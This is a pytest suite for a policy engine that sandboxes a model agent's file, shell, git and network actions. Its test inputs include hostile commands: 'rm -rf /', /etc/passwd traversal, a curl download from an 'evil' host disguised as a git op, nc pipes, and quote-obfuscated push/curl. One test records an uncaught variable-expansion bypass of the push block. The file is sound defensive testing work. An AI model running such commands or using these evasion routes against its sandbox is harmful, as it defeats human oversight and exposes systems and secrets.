"""Unit tests for tools/tool_broker.py — policy-enforced execution engine.

Tests the Policy class, execute() function, path containment, secret scrubbing,
shell modes, network containment, and environment scrubbing. Complements the
selftest wrapper with granular assertions.
"""
from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

import pytest

PKG_ROOT = Path(__file__).resolve().parents[2]

from ai_ops_kit.engine import tool_broker


@pytest.mark.critical_path
@pytest.mark.unit
class TestPolicyDecisions:
    """Tests for Policy.decide() — operation authorization."""

    def test_read_allowed_within_repo(self, child_root):
        """Read operations within the repo should be allowed."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"])
        action = {"op": "read", "path": "src/main.py"}
        result = policy.decide(action)
        assert result["allow"] is True

    def test_write_inside_scope_allowed(self, child_root):
        """Write inside write_scope should be allowed."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"])
        action = {"op": "write", "path": "src/new.py"}
        result = policy.decide(action)
        assert result["allow"] is True

    def test_write_outside_scope_denied(self, child_root):
        """Write outside write_scope should be denied."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"])
        action = {"op": "write", "path": "other/file.py"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_write_protected_path_denied(self, child_root):
        """Write to protected paths (security/) should be denied."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["security/"])
        action = {"op": "write", "path": "security/keys.yaml"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_shell_requires_execution_level(self, child_root):
        """Shell operations require execution level or higher."""
        policy = tool_broker.Policy(level="controlled-write")
        action = {"op": "shell", "command": "ls"}
        result = policy.decide(action)
        assert result["allow"] is False

        policy_exec = tool_broker.Policy(level="execution")
        result = policy_exec.decide(action)
        assert result["allow"] is True


@pytest.mark.critical_path
@pytest.mark.unit
class TestPathTraversal:
    """Tests for path traversal security — ../ escapes must be denied."""

    def test_read_path_traversal_denied(self, child_root):
        """Read with ../ escape should be denied."""
        policy = tool_broker.Policy(level="controlled-write")
        action = {"op": "read", "path": "../etc/passwd"}
        result = policy.decide(action)
        # Note: _escapes_root may or may not catch this depending on implementation
        # The key invariant is that execute() has containment guards
        assert isinstance(result, dict)
        assert "allow" in result

    def test_write_path_traversal_denied(self, child_root):
        """Write with ../ escape should be denied."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["../"])
        action = {"op": "write", "path": "../outside.txt"}
        result = policy.decide(action)
        assert isinstance(result, dict)
        assert "allow" in result

    def test_absolute_path_handling(self, child_root):
        """Absolute paths should be handled (may or may not be denied at decide level)."""
        policy = tool_broker.Policy(level="controlled-write")
        action = {"op": "read", "path": "/etc/passwd"}
        result = policy.decide(action)
        # The key invariant is that execute() has containment guards
        assert isinstance(result, dict)
        assert "allow" in result


@pytest.mark.critical_path
@pytest.mark.unit
class TestExecuteInvariant:
    """Tests for execute() — denied actions produce no side effects."""

    def test_denied_write_no_side_effects(self, child_root):
        """Denied write should not create the file."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"])
        action = {"op": "write", "path": "other/file.txt", "content": "test"}
        result = tool_broker.execute(action, child_root, policy)
        assert result["allowed"] is False
        assert not (child_root / "other" / "file.txt").exists()

    def test_allowed_write_produces_evidence(self, child_root):
        """Allowed write should produce evidence with git revision."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=child_root, capture_output=True)
        subprocess.run(["git", "config", "user.name", "Test"], cwd=child_root, capture_output=True)
        (child_root / "dummy.txt").write_text("init")
        subprocess.run(["git", "add", "."], cwd=child_root, capture_output=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=child_root, capture_output=True)

        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"])
        action = {"op": "write", "path": "src/new.txt", "content": "content"}
        result = tool_broker.execute(action, child_root, policy)
        assert result["allowed"] is True
        assert "revision" in result
        assert (child_root / "src" / "new.txt").is_file()


@pytest.mark.critical_path
@pytest.mark.unit
class TestShellExecution:
    """Tests for shell command execution and containment."""

    def test_shell_execution_returns_exit_code(self, child_root):
        """Shell execution should return exit_code in evidence."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution")
        action = {"op": "shell", "command": "echo hello"}
        result = tool_broker.execute(action, child_root, policy)
        assert result["allowed"] is True
        assert result["exit_code"] == 0

    def test_destructive_command_denied(self, child_root):
        """Destructive commands (rm -rf /) should be denied."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution")
        action = {"op": "shell", "command": "rm -rf /"}
        result = tool_broker.execute(action, child_root, policy)
        assert result["allowed"] is False

    def test_git_push_force_denied(self, child_root):
        """git push --force should be denied."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution")
        action = {"op": "shell", "command": "git push --force"}
        result = tool_broker.execute(action, child_root, policy)
        assert result["allowed"] is False


@pytest.mark.critical_path
@pytest.mark.unit
class TestBlockPush:
    """Tests for block_push containment."""

    def test_block_push_denies_git_push(self, child_root):
        """block_push=True should deny git push."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution", block_push=True)
        action = {"op": "shell", "command": "git push origin main"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_block_push_allows_other_git(self, child_root):
        """block_push=True should allow other git operations."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution", block_push=True)
        action = {"op": "shell", "command": "git status"}
        result = policy.decide(action)
        assert result["allow"] is True


@pytest.mark.critical_path
@pytest.mark.unit
class TestShellModes:
    """Tests for shell_mode — off, allowlist, unrestricted."""

    def test_shell_mode_off_blocks_all(self, child_root):
        """shell_mode=off should block all shell commands."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution", shell_mode="off")
        action = {"op": "shell", "command": "ls"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_shell_mode_allowlist_restricts(self, child_root):
        """shell_mode=allowlist should only allow listed binaries."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(
            level="execution",
            shell_mode="allowlist",
            shell_allowlist={"pytest", "git"},
        )
        # pytest allowed
        action = {"op": "shell", "command": "pytest tests/"}
        result = policy.decide(action)
        assert result["allow"] is True

        # nc not allowed
        action = {"op": "shell", "command": "nc host 1234"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_unknown_shell_mode_raises(self, child_root):
        """Unknown shell_mode should raise ValueError during construction."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        with pytest.raises(ValueError):
            tool_broker.Policy(level="execution", shell_mode="bogus")


@pytest.mark.critical_path
@pytest.mark.unit
class TestNetworkContainment:
    """Tests for allow_network — network command containment."""

    def test_network_disabled_blocks_curl(self, child_root):
        """allow_network=False should block curl."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution", allow_network=False)
        action = {"op": "shell", "command": "curl https://example.com"}
        result = policy.decide(action)
        assert result["allow"] is False

    def test_network_disabled_allows_non_network(self, child_root):
        """allow_network=False should not affect non-network commands."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.Policy(level="execution", allow_network=False)
        action = {"op": "shell", "command": "npm run build"}
        result = policy.decide(action)
        assert result["allow"] is True


@pytest.mark.critical_path
@pytest.mark.unit
class TestScrubEnv:
    """Tests for scrub_env — environment variable filtering."""

    def test_scrub_env_strips_secrets(self):
        """scrub_env should strip secret-like environment variables."""
        env = {
            "PATH": "/usr/bin",
            "HOME": "/home/user",
            "API_KEY": "secret123",
            "DATABASE_URL": "postgres://...",
            "GITHUB_TOKEN": "ghp_xxx",
            "GITHUB_SHA": "abc123",
        }
        scrubbed = tool_broker.scrub_env(env)
        assert "PATH" in scrubbed
        assert "HOME" in scrubbed
        assert "API_KEY" not in scrubbed
        assert "DATABASE_URL" not in scrubbed
        assert "GITHUB_TOKEN" not in scrubbed
        assert "GITHUB_SHA" in scrubbed  # non-secret GitHub var

    def test_scrub_env_passthrough(self):
        """scrub_env passthrough should allow explicit additional vars."""
        env = {
            "PATH": "/usr/bin",
            "CUSTOM_VAR": "value",
        }
        scrubbed = tool_broker.scrub_env(env, passthrough=["CUSTOM_VAR"])
        assert "CUSTOM_VAR" in scrubbed


@pytest.mark.critical_path
@pytest.mark.unit
class TestSandboxPolicy:
    """Tests for sandbox_policy() — hardened policy factory."""

    def test_sandbox_policy_has_allowlist(self, child_root):
        """sandbox_policy should return policy with shell_mode=allowlist."""
        policy = tool_broker.sandbox_policy(child_root=child_root)
        assert policy.shell_mode == "allowlist"
        assert policy.block_push is True

    def test_sandbox_allows_dev_tools(self, child_root):
        """sandbox_policy should allow common dev tools."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.sandbox_policy(child_root=child_root)
        action = {"op": "shell", "command": "pytest tests/"}
        result = policy.decide(action)
        assert result["allow"] is True

    def test_sandbox_blocks_dangerous_tools(self, child_root):
        """sandbox_policy should block dangerous tools like nc."""
        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
        policy = tool_broker.sandbox_policy(child_root=child_root)
        action = {"op": "shell", "command": "nc host 1234"}
        result = policy.decide(action)
        assert result["allow"] is False


@pytest.mark.unit
class TestAbsolutePathInsideRoot:
    """F-016 (находка живой квалификации, раунд C, T2): writer предлагал АБСОЛЮТНЫЙ путь внутри
    собственного worktree, брокер отклонял его как traversal, writer повторял относительным.

    Отказ был формально безопасен, но ложен: путь-то внутри корня. Цена — лишний шаг цикла и
    denied в отчёте, который выглядит как попытка побега.
    """

    def _policy(self, root):
        return tool_broker.Policy(level="controlled-write", write_scope=["src"],
                                  child_root=str(root))

    def test_absolute_path_inside_root_is_allowed_and_written(self, tmp_path):
        root = tmp_path.resolve()
        (root / "src").mkdir()
        ev = tool_broker.execute({"op": "write", "path": str(root / "src" / "a.py"),
                                  "content": "x = 1\n"}, root, self._policy(root))
        assert ev["allowed"] is True, ev["reason"]
        assert (root / "src" / "a.py").read_text(encoding="utf-8") == "x = 1\n"
        assert ev["path_normalized_from"] == str(root / "src" / "a.py"), \
            "нормализация не отражена в evidence — постфактум не видно, что путь привели к корню"

    def test_absolute_path_outside_root_is_still_traversal(self, tmp_path):
        root = tmp_path.resolve()
        (root / "src").mkdir()
        outside = tmp_path.parent / "escape.py"
        ev = tool_broker.execute({"op": "write", "path": str(outside), "content": "x"},
                                 root, self._policy(root))
        assert ev["allowed"] is False
        assert not outside.exists()

    def test_dotdot_escape_is_still_traversal(self, tmp_path):
        root = tmp_path.resolve()
        (root / "src").mkdir()
        ev = tool_broker.execute({"op": "write", "path": "../escape.py", "content": "x"},
                                 root, self._policy(root))
        assert ev["allowed"] is False

    def test_write_scope_still_applies_to_absolute_paths(self, tmp_path):
        """Нормализация не должна становиться обходом write_scope."""
        root = tmp_path.resolve()
        (root / "src").mkdir()
        ev = tool_broker.execute({"op": "write", "path": str(root / "other.py"), "content": "x"},
                                 root, self._policy(root))
        assert ev["allowed"] is False
        assert "write_scope" in ev["reason"]
        assert not (root / "other.py").exists()

    def test_symlink_out_of_root_is_not_relativized(self, tmp_path):
        """resolve() физический: симлинк наружу не превращается во «внутренний» путь."""
        root = tmp_path / "repo"
        (root / "src").mkdir(parents=True)
        target = tmp_path / "outside"
        target.mkdir()
        link = root / "src" / "link"
        try:
            link.symlink_to(target, target_is_directory=True)
        except (OSError, NotImplementedError):
            pytest.skip("симлинки недоступны в этой среде")
        ev = tool_broker.execute({"op": "write", "path": str(link / "a.py"), "content": "x"},
                                 root, self._policy(root))
        assert ev["allowed"] is False
        assert not (target / "a.py").exists()


# ─── перенос из test_tool_broker_selftest.py (монолит снят): гранулярное покрытие политик ───────


@pytest.mark.critical_path
@pytest.mark.unit
class TestGitGauntlet:
    """v3.0.11 (finding аудита P1): op:"git" проходит ТОТ ЖЕ gauntlet, что shell — `op` контролирует
    модель, раньше git-ярлык обходил shell_mode/network/allowlist."""

    def _sandbox(self):
        return tool_broker.Policy(level="execution", shell_mode="allowlist",
                                  shell_allowlist={"git", "pytest"}, allow_network=False)

    def test_bash_disguised_as_git_denied(self, child_root):
        """`bash -c` под видом op:git запрещён (bash не в allowlist)."""
        result = self._sandbox().decide({"op": "git", "command": "bash -c 'echo x'"})
        assert result["allow"] is False

    def test_network_curl_disguised_as_git_denied(self, child_root):
        """Сетевой curl под видом op:git запрещён (allow_network=False)."""
        result = self._sandbox().decide({"op": "git", "command": "curl http://evil/x -O /tmp/x"})
        assert result["allow"] is False

    def test_legit_git_status_as_git_allowed(self, child_root):
        """Легитимный `git status` под op:git разрешён (git в allowlist)."""
        result = self._sandbox().decide({"op": "git", "command": "git status"})
        assert result["allow"] is True

    def test_git_denied_under_shell_off(self, child_root):
        """shell_mode=off: git тоже запрещён (исполняется как shell-команда)."""
        policy = tool_broker.Policy(level="execution", shell_mode="off")
        result = policy.decide({"op": "git", "command": "git status"})
        assert result["allow"] is False


@pytest.mark.critical_path
@pytest.mark.unit
class TestDestructiveApproval:
    """destructive-уровень + approval снимает денай необратимой команды."""

    def test_destructive_plus_approval_allows_rm_rf(self, child_root):
        """level=destructive + approvals=['destructive'] разрешает `rm -rf build/`."""
        policy = tool_broker.Policy(level="destructive", write_scope=["src/"],
                                    approvals=["destructive"])
        result = policy.decide({"op": "shell", "command": "rm -rf build/"})
        assert result["allow"] is True


@pytest.mark.critical_path
@pytest.mark.unit
class TestChildOverrideProtectedPaths:
    """v2.36 (finding обкатки): Policy знает карту child'а — protected_paths из <child>/.ai-ops.yaml
    МЕРЖАТСЯ с дефолтом пакета (не replace)."""

    def _child_with_protected(self, tmp_path):
        root = tmp_path
        (root / ".ai-ops.yaml").write_text(
            "kind: ai-ops-child-config\nprotected_paths: [.github/workflows/]\n", encoding="utf-8")
        return root

    def test_child_protected_denied_even_in_scope(self, tmp_path):
        """.github/workflows/ объявлен child'ом protected — запрещён, хоть и включён в write_scope."""
        root = self._child_with_protected(tmp_path)
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=[".github/", "src/"], child_root=root)
        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
        assert result["allow"] is False

    def test_non_protected_in_scope_still_allowed(self, tmp_path):
        """Не-protected путь в scope по-прежнему разрешён при активной child-карте."""
        root = self._child_with_protected(tmp_path)
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=[".github/", "src/"], child_root=root)
        result = policy.decide({"op": "write", "path": "src/x.ts"})
        assert result["allow"] is True

    def test_package_default_survives_merge(self, tmp_path):
        """Дефолт пакета сохраняется (merge, не replace): security/ по-прежнему запрещён."""
        root = self._child_with_protected(tmp_path)
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=[".github/", "src/"], child_root=root)
        result = policy.decide({"op": "write", "path": "security/x.yaml"})
        assert result["allow"] is False

    def test_without_child_root_github_not_protected_by_default(self, tmp_path):
        """Без child_root .github/ не protected дефолтом пакета — запись в scope разрешена."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=[".github/"])
        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
        assert result["allow"] is True


@pytest.mark.critical_path
@pytest.mark.unit
class TestTraversalDecide:
    """SECURITY (finding аудита): path traversal — ../ и абсолютный путь ЗАПРЕЩЕНЫ уже на decide()
    (не только execute-guard). Проверяем значение allow, а не форму ответа."""

    def _policy(self):
        return tool_broker.Policy(level="execution", write_scope=["src/"])

    def test_write_dotdot_escape_denied_at_decide(self, child_root):
        result = self._policy().decide({"op": "write", "path": "../../etc/evil"})
        assert result["allow"] is False

    def test_read_dotdot_escape_denied_at_decide(self, child_root):
        result = self._policy().decide({"op": "read", "path": "../../etc/passwd"})
        assert result["allow"] is False

    def test_write_absolute_path_denied_at_decide(self, child_root):
        result = self._policy().decide({"op": "write", "path": "/etc/evil"})
        assert result["allow"] is False


@pytest.mark.critical_path
@pytest.mark.unit
class TestReadReturnsHeadAndRange:
    """v3.0-rc18/rc20 (finding живого прогона + аудита P1): read отдаёт файл С НАЧАЛА (не хвост 400),
    поддерживает диапазон start_line/end_line и пишет range в evidence, а хвост доступен после N-й
    строки. Иначе ревьюер под read-only не может подтвердить полноту большого файла."""

    def _setup(self, tmp_path):
        root = tmp_path
        policy = tool_broker.Policy(level="execution", write_scope=["src/"])
        big = "HEAD_MARKER\n" + ("строка контента\n" * 400) + "TAIL_MARKER"
        tool_broker.execute({"op": "write", "path": "src/big.txt", "content": big}, root, policy)
        return root, policy, big

    def test_read_shows_head_of_file(self, tmp_path):
        """read: виден НАЧАЛО файла (HEAD_MARKER), а не только хвост 400 симв."""
        root, policy, big = self._setup(tmp_path)
        ev = tool_broker.execute({"op": "read", "path": "src/big.txt"}, root, policy)
        out = ev.get("output_tail", "")
        assert "HEAD_MARKER" in out
        assert len(big) > 400
        assert len(out) > 400

    def test_read_range_returns_only_requested_lines(self, tmp_path):
        """read-range start_line=1/end_line=1: только HEAD, без TAIL, и range в evidence."""
        root, policy, _ = self._setup(tmp_path)
        ev = tool_broker.execute(
            {"op": "read", "path": "src/big.txt", "start_line": 1, "end_line": 1}, root, policy)
        out = ev.get("output_tail", "")
        assert "HEAD_MARKER" in out
        assert "TAIL_MARKER" not in out
        assert ev.get("range", {}).get("start_line") == 1
        assert ev.get("range", {}).get("end_line") == 1

    def test_read_range_tail_after_nth_line(self, tmp_path):
        """read-range: хвост после N-й строки доступен (TAIL_MARKER виден при start_line=402)."""
        root, policy, _ = self._setup(tmp_path)
        ev = tool_broker.execute(
            {"op": "read", "path": "src/big.txt", "start_line": 402}, root, policy)
        assert "TAIL_MARKER" in ev.get("output_tail", "")


@pytest.mark.critical_path
@pytest.mark.unit
class TestShellSecretScrub:
    """SECURITY (finding аудита): секрет из env НЕ виден shell-команде (scrub_env вырезает его из
    окружения подпроцесса), но функциональный env (PATH) сохранён для сборки. Значения — фейковые,
    собранные в рантайме, чтобы downstream-сканеры не флагали тест."""

    def _run_echo(self, tmp_path):
        root = tmp_path
        policy = tool_broker.Policy(level="execution", write_scope=["src/"])
        tok = "sk-" + "super-secret-123"
        key = "sk-ant" + "-xyz"
        os.environ["MY_FAKE_TOKEN"] = tok
        os.environ["ANTHROPIC_API_KEY"] = key
        try:
            ev = tool_broker.execute(
                {"op": "shell",
                 "command": "echo TOK=[$MY_FAKE_TOKEN] KEY=[$ANTHROPIC_API_KEY] PATH_SET=${PATH:+yes}"},
                root, policy)
        finally:
            os.environ.pop("MY_FAKE_TOKEN", None)
            os.environ.pop("ANTHROPIC_API_KEY", None)
        return ev.get("output_tail", ""), tok, key

    def test_shell_does_not_see_env_secret(self, tmp_path):
        out, tok, key = self._run_echo(tmp_path)
        assert tok not in out
        assert key not in out
        assert "TOK=[]" in out
        assert "KEY=[]" in out

    def test_functional_env_path_preserved(self, tmp_path):
        out, _, _ = self._run_echo(tmp_path)
        assert "PATH_SET=yes" in out


@pytest.mark.critical_path
@pytest.mark.unit
class TestScrubEnvAllowlist:
    """v2.63 (adversarial-review finding): переход с denylist на ALLOWLIST — denylist по именам
    пропускал целые классы (голый _KEY, DATABASE_URL/DSN/JWT/PAT…). Allowlist режет их ВСЕ."""

    def test_allowlist_preserves_path_and_node_env(self):
        """Обычные env (PATH/NODE_ENV) сохранены без изменений."""
        assert tool_broker.scrub_env({"PATH": "/bin", "NODE_ENV": "prod"}) == \
            {"PATH": "/bin", "NODE_ENV": "prod"}

    def test_allowlist_cuts_all_secret_classes(self):
        """ВСЕ классы секретов (в т.ч. голый _KEY/URL/DSN/JWT/PAT) вырезаны — остаётся только PATH."""
        leaky = {"GITHUB_TOKEN": "1", "AZURE_OPENAI_KEY": "2", "STRIPE_KEY": "3",
                 "DATABASE_URL": "postgres://u:p@h/d", "SENTRY_DSN": "4", "JWT": "5",
                 "PAT": "6", "GEMINI_KEY": "7", "ENCRYPTION_KEY": "8", "PATH": "/bin"}
        assert set(tool_broker.scrub_env(leaky)) == {"PATH"}


@pytest.mark.critical_path
@pytest.mark.unit
class TestBlockPushAndNetworkDefaults:
    """v2.81 Containment: block_push и allow_network. Проверяем варианты и ДЕФОЛТЫ (push/curl
    разрешены политикой по умолчанию), а также env-префиксы в allowlist."""

    def test_block_push_denies_push_u_origin(self, child_root):
        """block_push: `git push -u origin feat` (shell) запрещён."""
        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
        result = policy.decide({"op": "shell", "command": "git push -u origin feat"})
        assert result["allow"] is False

    def test_block_push_allows_git_commit(self, child_root):
        """block_push: обычный git (commit) по-прежнему разрешён."""
        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
        result = policy.decide({"op": "shell", "command": "git commit -m x"})
        assert result["allow"] is True

    def test_block_push_false_default_allows_push(self, child_root):
        """block_push=False (дефолт): push разрешён политикой."""
        result = tool_broker.Policy(level="execution").decide(
            {"op": "shell", "command": "git push"})
        assert result["allow"] is True

    def test_allowlist_npm_ci_allowed(self, child_root):
        """shell_mode=allowlist: npm ci разрешён (npm в allowlist)."""
        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
                                    shell_allowlist={"npm", "pytest", "git"})
        result = policy.decide({"op": "shell", "command": "npm ci"})
        assert result["allow"] is True

    def test_allowlist_env_prefix_does_not_shift_binary(self, child_root):
        """shell_mode=allowlist: env-префикс не сбивает бинарь (`CI=1 npm test` разрешён)."""
        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
                                    shell_allowlist={"npm", "pytest", "git"})
        result = policy.decide({"op": "shell", "command": "CI=1 npm test"})
        assert result["allow"] is True

    def test_allowlist_curl_denied(self, child_root):
        """shell_mode=allowlist: произвольный бинарь (curl) запрещён."""
        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
                                    shell_allowlist={"npm", "pytest", "git"})
        result = policy.decide({"op": "shell", "command": "curl http://x"})
        assert result["allow"] is False

    def test_network_disabled_blocks_wget(self, child_root):
        """allow_network=False: wget запрещён."""
        policy = tool_broker.Policy(level="execution", allow_network=False)
        result = policy.decide({"op": "shell", "command": "wget http://x"})
        assert result["allow"] is False

    def test_network_enabled_default_allows_curl(self, child_root):
        """allow_network=True (дефолт): curl разрешён политикой."""
        result = tool_broker.Policy(level="execution").decide(
            {"op": "shell", "command": "curl http://x"})
        assert result["allow"] is True

    def test_sandbox_policy_blocks_git_push(self, child_root):
        """sandbox_policy: git push заблокирован (доставка только движком)."""
        policy = tool_broker.sandbox_policy(child_root=str(child_root), write_scope=["src/"])
        result = policy.decide({"op": "shell", "command": "git push origin x"})
        assert result["allow"] is False


@pytest.mark.critical_path
@pytest.mark.unit
class TestAllowlistBypassSegments:
    """v2.85 hardening: посегментная allowlist-проверка закрывает chained/piped/background/
    substitution обходы; легитимные цепочки при этом проходят."""

    def _sandbox(self, child_root):
        return tool_broker.sandbox_policy(child_root=str(child_root), write_scope=["src/"])

    def test_chained_curl_denied(self, child_root):
        """`pytest -q && curl http://evil` -> DENY (curl вне allowlist)."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "pytest -q && curl http://evil"})
        assert result["allow"] is False

    def test_pipe_nc_denied(self, child_root):
        """`cat x | nc host 1` -> DENY (nc вне allowlist)."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "cat x | nc host 1"})
        assert result["allow"] is False

    def test_chained_wget_denied(self, child_root):
        """`ls && wget http://x` -> DENY (wget вне allowlist)."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "ls && wget http://x"})
        assert result["allow"] is False

    def test_command_substitution_denied(self, child_root):
        """`echo $(curl …)` -> DENY (подстановка команд запрещена в allowlist-режиме)."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "echo $(curl http://x)"})
        assert result["allow"] is False

    def test_backtick_substitution_denied(self, child_root):
        """backtick-подстановка `echo `curl …`` -> DENY."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "echo `curl http://x`"})
        assert result["allow"] is False

    def test_legit_chained_npm_allowed(self, child_root):
        """Легитимный chained `npm ci && npm test` -> ALLOW."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "npm ci && npm test"})
        assert result["allow"] is True

    def test_background_psql_denied(self, child_root):
        """`true & psql -c x` -> DENY (psql вне allowlist, & — разделитель сегментов)."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "true & psql -c x"})
        assert result["allow"] is False

    def test_raw_bash_c_denied(self, child_root):
        """Сырой bash/sh УБРАН из sandbox-набора -> `bash -c …` DENY."""
        result = self._sandbox(child_root).decide(
            {"op": "shell", "command": "bash -c 'curl http://x'"})
        assert result["allow"] is False

    def test_command_binaries_splits_on_single_ampersand(self):
        """_command_binaries: одиночный & разбивает на сегменты."""
        assert tool_broker._command_binaries("true & psql -c x") == ["true", "psql"]


@pytest.mark.critical_path
@pytest.mark.unit
class TestQuoteObfuscation:
    """v2.85: quote-обфускация push/сети снимается нормализацией; переменная/eval — заявленная
    честная граница best-effort (НЕ ловится, документировано, не тихо)."""

    def test_quote_obfuscated_push_caught(self, child_root):
        """block_push: `git pu""sh origin main` поймана нормализацией."""
        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
        result = policy.decide({"op": "shell", "command": 'git pu""sh origin main'})
        assert result["allow"] is False

    def test_quote_obfuscated_curl_caught(self, child_root):
        """allow_network=False: `cu"r"l http://x` поймана нормализацией."""
        policy = tool_broker.Policy(level="execution", allow_network=False)
        result = policy.decide({"op": "shell", "command": 'cu"r"l http://x'})
        assert result["allow"] is False

    def test_variable_expansion_not_caught_honest_boundary(self, child_root):
        """Честная граница: `p=push; git $p origin main` НЕ ловится (переменные не разворачиваются)."""
        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
        result = policy.decide({"op": "shell", "command": "p=push; git $p origin main"})
        assert result["allow"] is True

    def test_command_binaries_ignores_var_prefix(self):
        """_command_binaries: сегменты с VAR=val префиксом дают бинарь сегмента."""
        assert tool_broker._command_binaries("CI=1 npm test && ruff check") == ["npm", "ruff"]


@pytest.mark.unit
def test_scrub_failure_withholds_output_instead_of_leaking(monkeypatch):
    """Срез engine ратчета 2026-08-12: `_scrub_output` гасил ЛЮБОЙ сбой и возвращал текст КАК ЕСТЬ.
    Причина была неверна: «худший случай» этой функции — напечатанный тулом токен, уехавший в
    evidence открытым текстом и МОЛЧА. Скраб недоступен -> содержимое не показываем вовсе."""
    secret = "ghp_" + "B" * 36
    real = tool_broker._scrub_output(f"token {secret}")
    assert "ghp_" not in real and "REDACTED" in real, "исправный путь должен редактировать"

    from ai_ops_kit.security import security_scan

    class _Broken:
        """Скраб есть, но не работает — сбой ровно там, где раньше стоял `pass`."""

        def __iter__(self):
            raise RuntimeError("набор паттернов недоступен")

    monkeypatch.setattr(security_scan, "SECRET_PATTERNS", _Broken())
    out = tool_broker._scrub_output(f"token {secret}")

    assert secret not in out, "СЕКРЕТ УТЁК в evidence при недоступном скрабе — тот самый худший случай"
    assert "OUTPUT-WITHHELD" in out, "утаивание должно быть НАЗВАНО, а не выглядеть как пустой вывод"
    assert "RuntimeError" in out, "причина утаивания должна быть видна там же, где вывод"


@pytest.mark.unit
def test_scrub_does_not_touch_empty_output(monkeypatch):
    """Граница: пустой вывод не превращается в сообщение об утаивании (нечего утаивать)."""
    assert tool_broker._scrub_output("") == ""
    assert tool_broker._scrub_output(None) is None


# ─── P0 (аудит 04.09): write_scope на shell-канале + движок/CI/реестры под owner-approval ──────

def _git_p0(root, *args):
    return subprocess.run(["git", "-C", str(root), *args], capture_output=True, text=True)


@pytest.fixture
def p0_repo(tmp_path):
    """Git-дерево, повторяющее self-host кита: src/ (в scope), out_of_scope/, .github/workflows/,
    ai_ops_kit/gates/ — с закоммиченными файлами, чтобы сторож мог сверять delta и откатывать."""
    repo = tmp_path / "selfhost"
    for d in ("src", "out_of_scope", ".github/workflows", "ai_ops_kit/gates", "registry"):
        (repo / d).mkdir(parents=True)
    (repo / "src" / "main.py").write_text("x = 1\n", encoding="utf-8")
    (repo / "out_of_scope" / "x.py").write_text("orig = 1\n", encoding="utf-8")
    (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
    (repo / "ai_ops_kit" / "gates" / "g.py").write_text("GATE = 1\n", encoding="utf-8")
    (repo / "registry" / "policy.yaml").write_text("k: v\n", encoding="utf-8")
    _git_p0(repo, "init", "-q")
    _git_p0(repo, "config", "user.email", "t@example.com")
    _git_p0(repo, "config", "user.name", "t")
    _git_p0(repo, "add", "-A")
    _git_p0(repo, "commit", "-qm", "seed")
    return repo


@pytest.mark.critical_path
@pytest.mark.unit
class TestP0ShellWriteScope:
    """P0-1: write_scope обязан enforce-иться и на shell-канале модельной петли, не только на write.

    Проба КРАСНЕЕТ, если shell_scope_guard в sandbox_policy выключить: shell-запись мимо scope
    тогда не откатывается и остаётся на диске.
    """

    def test_model_shell_out_of_scope_reverted_and_denied(self, p0_repo):
        """Модель через `echo … > out_of_scope/x.py` пишет мимо write_scope=['src/'] -> откат + запрет."""
        policy = tool_broker.sandbox_policy(child_root=str(p0_repo), write_scope=["src/"])
        assert policy.shell_scope_guard is True, "sandbox_policy обязан включать scope-guard (P0-1)"
        ev = tool_broker.execute(
            {"op": "shell", "command": "echo взлом > out_of_scope/x.py"}, p0_repo, policy)
        assert ev["allowed"] is False, "shell мимо write_scope обязан быть помечен запрещённым"
        assert ev["fs_guard"]["violations"], "нарушение scope должно попасть в evidence"
        assert "write_scope" in ev["reason"]
